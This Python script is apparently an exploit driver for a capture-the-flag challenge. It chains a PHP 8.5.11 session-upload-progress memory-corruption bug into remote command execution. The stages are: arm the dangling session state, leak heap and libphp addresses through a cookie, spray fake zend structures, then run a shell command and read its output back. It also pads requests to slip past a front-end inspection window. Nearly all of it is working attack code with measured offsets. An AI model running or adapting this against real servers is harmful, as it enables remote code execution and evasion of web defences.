#!/usr/bin/env python3
"""8.5.11 terminal driver for the Cloudflare-ini geometry (D1/D3).

Why this exists
---------------
The measured Cloudflare ini enforces ``max_input_vars=1000``. The published
arm (``transplant._arm_parts``) puts the file part at position 1004, *after*
1001 pads. The 1001st pad raises ``Input variables exceeded 1000`` during
parsing; with ``display_errors=On`` that warning is written to the response, so
``headers_sent`` flips before the upload-progress ``FILE_START`` event runs.
``php_session_initialize()`` then fails at ``php_session_send_cookie()``
("Session cookie cannot be sent after headers have already been sent") and
returns before ``php_session_track_init()`` -- so ``PS(http_session_vars)`` is
**never created** and there is nothing to dangle.

gdb on php:8.5.11-apache (mirror, measured 2026-10-28) confirms it:
published arm -> 0 hits on ``php_session_track_init``; 990-pad arm -> the
reference and its type (0x30a) are visible at ``_zend_bailout``.

This driver therefore arms with <=1000 registered fields and keeps the bomb
last, so both dangles exist (``PS(id)`` and ``PS(http_session_vars)``), and
prints the chunk-relative terminal slot measured under that shape.

Stages
------
``arm``    one arm request (pad count / line count configurable)
``leak``   arm + disclosure probe with the closed-loop filler calibration
``fire``   arm + one page spray, then the write+read oracle
``chain``  leak -> terminal at the gdb-measured page
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import struct
import sys
import time
import urllib.parse

sys.path.insert(0, os.environ.get("P2S_TOOL", "/root/chainetool-v106/e2e"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from p2s import transplant  # noqa: E402
import pin  # noqa: E402

FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,20}\{[ -~]{4,256}\}")
#: gdb-measured, 990-pad arm on php:8.5.11-apache @128M (mirror, 2026-10-28):
#:   PS(http_session_vars) ref = chunk + 0xa50e0  (type 0x30a at bailout)
#:   PS(id) zend_string        = chunk + 0xa6000
R0_OFF_8511 = 0xA50E0
ID_OFF_8511 = 0xA6000
LOWBITS_8511 = (0x0E0,)


def split_arm(parts):
    pads, carriers, bomb = parts[:-4], parts[-4:-1], parts[-1:]
    return pads, carriers, bomb


def arm_body(lines: int, pads_n: int, boundary: bytes,
             order: str = "trim", sid: bytes = b"\x00") -> bytes:
    """Arm shape.

    ``trim``      file part before a <=998-pad run, bomb last. The session
                  initialises (headers are still clean at FILE_START), so
                  ``php_session_track_init`` runs and PS(http_session_vars) is
                  created -- the terminal substrate.
    ``published`` the shipped 1001-pad order. The 1001st pad sends headers, the
                  progress cookie send fails, ``php_session_initialize`` aborts
                  before track_init, PS(send_cookie) is left 1 and PS(id) points
                  at the freed id string -- the disclosure substrate.
    """
    pads, carriers, bomb = split_arm(transplant._arm_parts(lines))
    if sid is not None:
        fixed = []
        for part in carriers:
            if part[0] == "PHPSESSID":
                part = (part[0], sid) + tuple(part[2:])
            fixed.append(part)
        carriers = fixed
    if order == "published":
        return transplant._parts_to_body(pads + carriers + bomb, boundary)
    return transplant._parts_to_body(pads[:pads_n] + carriers + bomb, boundary)


def post_raw(host, port, tls, path, body, boundary, *, cookie=None,
             keepalive=False, timeout=180.0):
    sock = pin.open_sock(host, port, tls, timeout)
    head = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        "Content-Type: multipart/form-data; boundary=" + boundary.decode() + "\r\n"
    )
    if cookie:
        head += f"Cookie: PHPSESSID={cookie}\r\n"
    head += (f"Content-Length: {len(body)}\r\n"
             f"Connection: {'keep-alive' if keepalive else 'close'}\r\n\r\n")
    sock.sendall(head.encode() + body)
    try:
        header, payload, leftover = pin.read_response(sock, b"")
    except EOFError:
        header, payload, leftover = b"", b"", b""
    finally:
        if not keepalive:
            sock.close()
    return header, payload, sock


def oracle_read(host, port, tls, path, timeout=60.0):
    """POST the written file path and return its bytes (no GET anywhere)."""
    sock = pin.open_sock(host, port, tls, timeout)
    request = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               "Content-Length: 0\r\nConnection: close\r\n\r\n")
    sock.sendall(request.encode())
    try:
        header, payload, _ = pin.read_response(sock, b"")
    except EOFError:
        header, payload = b"", b""
    finally:
        sock.close()
    return header, payload


def header_value(header: bytes, name: bytes) -> str:
    for line in header.split(b"\r\n")[1:]:
        key, _, value = line.partition(b":")
        if key.strip().lower() == name.lower():
            return value.strip().decode("latin1")
    return ""


def verify(url: str, flag: str, attempt_id: str) -> dict:
    """POST {attemptId, flag} to the challenge's verify endpoint."""
    import urllib.error
    import urllib.request

    body = json.dumps({"attemptId": attempt_id, "flag": flag}).encode()
    request = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return {"status": response.status,
                    "body": response.read().decode("latin1")}
    except urllib.error.HTTPError as error:
        return {"status": error.code, "body": error.read().decode("latin1")}
    except Exception as error:  # noqa: BLE001 - recorded, never a verdict
        return {"status": 0, "error": repr(error)}


def leak_stage(args, host, port, tls):
    """Arm (990 pads) + disclosure probe with filler closed loop."""
    row = {"attempts": [], "fillers": args.fillers, "heap": 0, "libphp": 0}
    boundary_d = b"B" * 10
    for attempt in range(1, args.leak_attempts + 1):
        arm = arm_body(args.lines, args.pads, b"S" * 17, order=args.leak_arm)
        if args.pad_size and not args.no_pad:
            arm = pin.pad(arm, b"S" * 17, args.pad_size)
        header, payload, _ = post_raw(host, port, tls, args.path, arm, b"S" * 17)
        oom = b"Allowed memory size" in payload
        disc = transplant._parts_to_body(
            transplant._disclosure_parts(args.window_probe, 0, row["fillers"]),
            boundary_d)
        if args.pad_size and not args.no_pad:
            disc = pin.pad(disc, boundary_d, args.pad_size)
        header, payload, _ = post_raw(host, port, tls, args.path, disc, boundary_d)
        cookie = pin.cookie_payload(header)
        vindex = None
        match = re.fullmatch(rb"v(\d{4})x+", cookie)
        if match:
            vindex = int(match.group(1))
        decoded = transplant.decode(cookie, args.dtor)
        row["attempts"].append({
            "attempt": attempt, "arm_oom": oom, "fillers": row["fillers"],
            "disc_status": header.split(b"\r\n", 1)[0].decode("latin1"),
            "cookie_len": len(cookie), "vindex": vindex,
            "heap": hex(decoded["heap"]),
        })
        print(json.dumps(row["attempts"][-1]))
        if vindex is not None and vindex and vindex != row["fillers"]:
            row["fillers"] = vindex
            continue
        if decoded["heap"]:
            row["heap"] = decoded["heap"]
            break
        time.sleep(args.pacing)
    if not row["heap"]:
        row["verdict"] = "LEAK_FAILED"
        return row
    # full window for both bases
    boundary_d = b"B" * 10
    arm = arm_body(args.lines, args.pads, b"S" * 17, order=args.leak_arm)
    if args.pad_size and not args.no_pad:
        arm = pin.pad(arm, b"S" * 17, args.pad_size)
    post_raw(host, port, tls, args.path, arm, b"S" * 17)
    disc = transplant._parts_to_body(
        transplant._disclosure_parts(args.window_full, args.arrays,
                                     row["fillers"]), boundary_d)
    if args.pad_size and not args.no_pad:
        disc = pin.pad(disc, boundary_d, args.pad_size)
    header, payload, _ = post_raw(host, port, tls, args.path, disc, boundary_d)
    cookie = pin.cookie_payload(header)
    decoded = transplant.decode(cookie, args.dtor)
    row["full"] = {"cookie_len": len(cookie), "heap": hex(decoded["heap"]),
                   "libphp": hex(decoded["libphp"]),
                   "heap_votes": decoded["heap_votes"],
                   "module_votes": decoded["module_votes"]}
    row["heap"] = decoded["heap"] or row["heap"]
    row["libphp"] = decoded["libphp"]
    row["verdict"] = "LEAK" if (row["heap"] and row["libphp"]) else "LEAK_PARTIAL"
    print(json.dumps(row["full"]))
    return row


def full_page_value(page: int, zif: int, cmd: bytes) -> bytes:
    """One 4071 B value carrying a fake reference at EVERY 32-byte slot.

    zend_reference is 0x18 bytes on the wire but every emalloc'd reference in
    this build is 32-byte aligned (bin 32; the 8.4.26 r0 0x6a160 and the 8.5.11
    r0 0x1a7120 are both multiples of 32), so a 0x20 stride tiles every
    candidate low-bit. The fake HashTable occupies part of the page, so the
    slots that collide with it are skipped.
    """
    import struct as _struct

    htdata = page + transplant.HT_PAGE_OFFSET
    table = transplant._payload(htdata, zif, cmd)
    buffer = bytearray(b"." * transplant.SPRAY_VLEN)
    start = transplant.HT_PAGE_OFFSET - 0x18
    for offset in range(0x8, transplant.SPRAY_VLEN - 0x20, 0x20):
        if start <= offset < start + len(table):
            continue
        _struct.pack_into("<II", buffer, offset, 1, 10)
        _struct.pack_into("<Q", buffer, offset + 0x08, htdata)
        _struct.pack_into("<Q", buffer, offset + 0x10, 0x307)
    buffer[start:start + len(table)] = table
    return bytes(buffer)


def latch_stage(args, host, port, tls):
    """One arm, then K disclosures on fresh connections (the live lottery).

    The live front does not preserve client affinity into the prefork child
    (measured 0/8 keep-alive), so the disclosure has to land on the armed
    child by luck. Every landing is informative: `vNNNN` names the filler
    index (the closed loop), 4096/0x20000 is a forged-window dump, and a
    `3 * 0x7a7a7a7a7a7a7a7a` fatal is a pad capture (a landing, not a miss).
    """
    boundary_s, boundary_d = b"S" * 17, b"B" * 10
    arm = arm_body(args.lines, args.pads, boundary_s, order="published")
    if args.pad_size and not args.no_pad:
        arm = pin.pad(arm, boundary_s, args.pad_size)
    header, payload, _ = post_raw(host, port, tls, args.path, arm, boundary_s)
    row = {
        "arm_status": header.split(b"\r\n", 1)[0].decode("latin1"),
        "arm_oom": b"Allowed memory size" in payload,
        "disclosures": [], "landed": [],
    }
    print(json.dumps({k: row[k] for k in ("arm_status", "arm_oom")}))
    for index in range(1, args.latch + 1):
        disc = transplant._parts_to_body(
            transplant._disclosure_parts(args.window_probe, 0, args.fillers),
            boundary_d)
        if args.pad_size and not args.no_pad:
            disc = pin.pad(disc, boundary_d, args.pad_size)
        header, payload, _ = post_raw(host, port, tls, args.path, disc, boundary_d)
        cookie = pin.cookie_payload(header)
        status = header.split(b"\r\n", 1)[0].decode("latin1") if header else "closed"
        entry = {
            "n": index, "status": status, "cookie_len": len(cookie),
            "cookie": cookie[:64].decode("latin1", "replace"),
            "attempt_id": header_value(header, b"x-attempt-id"),
            "fatal": b"Possible integer overflow" in payload,
            "pad_capture": b"0x7a7a7a7a7a7a7a7a" in payload,
        }
        row["disclosures"].append(entry)
        print(json.dumps({k: entry[k] for k in
                          ("n", "status", "cookie_len", "pad_capture")}))
        if len(cookie) > 32:
            entry["verdict"] = "LANDED"
            row["landed"].append(entry)
            break
        time.sleep(args.pacing)
    row["verdict"] = "LANDED" if row["landed"] else "NO_LANDING"
    return row


def fire_stage(args, host, port, tls, heap, libphp):
    """Arm, then one spray page, then the write+read oracle."""
    zif = libphp + args.zif
    page = (heap + args.r0) & ~0xFFF
    if args.full_page:
        value = full_page_value(page, zif, args.cmd.encode())
    else:
        value = transplant.spray_value(page, zif, args.lowbits,
                                       args.cmd.encode())
    carriers = [("PHPSESSID", transplant.WINDOW_SID),
                ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    values = [(f"s{i:03d}", value) for i in range(args.spray_count)]
    # `--spray-first` puts ~1.6 MB of sprayed values ahead of the blocked
    # literal, so the request clears the live front's 1 MiB inspection window
    # *without* a pad. A pad in the spray request competes for the latch slot
    # (measured live: the capture's length field was read out of the pad), so
    # the pad-free shape is the one the terminal needs.
    parts = (values + carriers) if args.spray_first else (carriers + values)
    body = transplant._parts_to_body(parts, b"B" * 10)
    if args.spray_pad:
        body = pin.pad(body, b"B" * 10, args.pad_size)
    trigger = arm_body(args.lines, args.pads, b"S" * 17, order="trim",
                       sid=args.arm_sid.encode() or b"\x00")
    if args.pad_size and not args.no_pad:
        trigger = pin.pad(trigger, b"S" * 17, args.pad_size)
    row = {"page": hex(page), "r0": hex(args.r0), "lowbits": list(args.lowbits),
           "htdata": hex(page + transplant.HT_PAGE_OFFSET),
           "zif": hex(zif), "spray_wire": len(body)}
    header, payload, _ = post_raw(host, port, tls, args.path, trigger, b"S" * 17)
    row["arm_oom"] = b"Allowed memory size" in payload
    time.sleep(args.inter)
    header, payload, _ = post_raw(host, port, tls, args.path, body, b"B" * 10)
    row["spray_status"] = header.split(b"\r\n", 1)[0].decode("latin1") if header else "closed"
    time.sleep(args.inter)
    header, payload = oracle_read(host, port, tls, args.fetch)
    row["fetch_status"] = header.split(b"\r\n", 1)[0].decode("latin1") if header else "closed"
    row["fetch_len"] = len(payload)
    row["fetch_head"] = payload[:200].decode("latin1", "replace")
    row["attempt_id"] = header_value(header, b"x-attempt-id")
    row["hit"] = args.expect.encode() in payload
    if row["hit"]:
        match = FLAG_RE.search(payload)
        row["flag"] = match.group(0).decode("latin1") if match else ""
        if row["flag"] and args.verify_url and row["attempt_id"]:
            row["verify"] = verify(args.verify_url, row["flag"],
                                   row["attempt_id"])
    row["verdict"] = "PROOF" if row["hit"] else "NO_PROOF"
    return row


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:19185/php/index.php")
    parser.add_argument("--stage",
                        choices=("arm", "leak", "latch", "fire", "chain"),
                        default="chain")
    parser.add_argument("--latch", type=int, default=24,
                        help="disclosures per latch spray")
    parser.add_argument("--lines", type=int, default=470000)
    parser.add_argument("--pads", type=int, default=990)
    parser.add_argument("--leak-arm", choices=("published", "trim"),
                        default="published")
    parser.add_argument("--arm-sid", default="")
    parser.add_argument("--fillers", type=int, default=841)
    parser.add_argument("--arrays", type=int, default=150)
    parser.add_argument("--window-probe", type=lambda v: int(v, 0), default=0x1000)
    parser.add_argument("--window-full", type=lambda v: int(v, 0), default=0x20000)
    parser.add_argument("--leak-attempts", type=int, default=6)
    parser.add_argument("--r0", type=lambda v: int(v, 0), default=R0_OFF_8511)
    parser.add_argument("--r0-pages", type=lambda v: [int(x, 0) for x in str(v).split(",")],
                        default=None,
                        help="comma separated page offsets to try in order")
    parser.add_argument("--lowbits", type=lambda v: tuple(
        int(x, 0) for x in str(v).split(",")), default=LOWBITS_8511)
    parser.add_argument("--zif", type=lambda v: int(v, 0), default=0x5996E0)
    parser.add_argument("--dtor", type=lambda v: int(v, 0), default=0x7B47A0)
    parser.add_argument("--heap", type=lambda v: int(v, 0), default=0)
    parser.add_argument("--libphp", type=lambda v: int(v, 0), default=0)
    parser.add_argument("--spray-count", type=int, default=400)
    parser.add_argument("--cmd", default="id>/var/www/html/php/x.txt")
    parser.add_argument("--fetch", default="/php/x.txt")
    parser.add_argument("--expect", default="uid=")
    parser.add_argument("--verify-url", default="")
    parser.add_argument("--spray-pad", action="store_true")
    parser.add_argument("--spray-first", action="store_true")
    parser.add_argument("--full-page", action="store_true")
    parser.add_argument("--no-pad", action="store_true")
    parser.add_argument("--pad-size", type=int, default=(1 << 20) + 8192)
    parser.add_argument("--inter", type=float, default=0.4)
    parser.add_argument("--pacing", type=float, default=0.5)
    parser.add_argument("--out", default="/root/cfctf-mirror/out/chain8511.json")
    args = parser.parse_args(argv)
    if args.r0_pages is None:
        args.r0_pages = [args.r0]
    parsed = urllib.parse.urlsplit(args.url)
    tls = parsed.scheme == "https"
    host, port = parsed.hostname, parsed.port or (443 if tls else 80)
    args.path = parsed.path or "/"

    document = {"config": {k: v for k, v in vars(args).items()
                           if k != "lowbits"}}
    document["config"]["lowbits"] = [hex(v) for v in args.lowbits]
    began = time.time()
    if args.stage == "arm":
        arm = arm_body(args.lines, args.pads, b"S" * 17)
        header, payload, _ = post_raw(host, port, tls, args.path, arm, b"S" * 17)
        document["arm"] = {
            "wire": len(arm),
            "status": header.split(b"\r\n", 1)[0].decode("latin1"),
            "oom": b"Allowed memory size" in payload,
            "body_head": payload[:300].decode("latin1", "replace"),
        }
        print(json.dumps(document["arm"], indent=2))
    if args.stage == "latch":
        document["latch"] = latch_stage(args, host, port, tls)
        document["verdict"] = document["latch"]["verdict"]
    if args.stage in ("leak", "chain"):
        document["leak"] = leak_stage(args, host, port, tls)
    heap = args.heap or document.get("leak", {}).get("heap") or 0
    libphp = args.libphp or document.get("leak", {}).get("libphp") or 0
    if args.stage in ("fire", "chain") and heap and libphp:
        rows = []
        for offset in args.r0_pages:
            args.r0 = offset
            row = fire_stage(args, host, port, tls, heap, libphp)
            rows.append(row)
            print(json.dumps({k: row[k] for k in ("r0", "page", "fetch_status",
                                                  "hit", "verdict")}))
            if row["hit"]:
                break
            time.sleep(args.pacing)
        document["fire"] = rows[-1]
        document["fires"] = rows
        document["verdict"] = rows[-1]["verdict"]
    document["elapsed_s"] = round(time.time() - began, 1)
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(document, handle, indent=2, default=str)
    print(json.dumps({k: document.get(k) for k in ("verdict",)}, indent=2))
    print(f"WROTE {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
